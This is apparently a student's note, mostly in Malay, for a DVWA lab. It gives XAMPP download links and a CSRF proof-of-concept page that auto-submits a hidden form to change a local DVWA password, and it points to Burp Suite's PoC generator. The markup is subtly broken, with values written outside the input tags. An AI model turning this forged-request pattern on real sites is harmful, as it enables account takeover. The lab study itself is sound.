XAMPP FOR WINDOWS
https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-windows-x64-8.1.6-0-VS16-installer.exe?from_af=true

XAMPP FOR LINUX
https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-linux-x64-8.1.6-0-installer.run?from_af=true

XAMPP FOR OS X
https://downloadsapachefriends.global.ssl.fastly.net/8.1.6/xampp-osx-8.1.6-0-vm.dmg?from_af=true

CSRF DVWA
Nak tgk contoh script DVWA
https://www.invicti.com/web-vulnerability-scanner/vulnerabilities/cross-site-request-forgery-in-login-form/

Script Contoh CSRF Request Custom
<html>
    <body>

        <form action="http://localhost:8080/DVWA-master/DVWA-master/vulnerabilities/csrf/?" method="GET">
            New password:<br />
            <input type="hidden" AUTOCOMPLETE="off" name="password_new"> value=test123<br />
            Confirm new password:<br />
            <input type="hidden" AUTOCOMPLETE="off" name="password_conf"> value=test123<br />
            <br />
            <input type="hidden" value="Change" name="Change">

        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
 *Atau dekat bahagian burp suite, ada generate CSRF Poc.
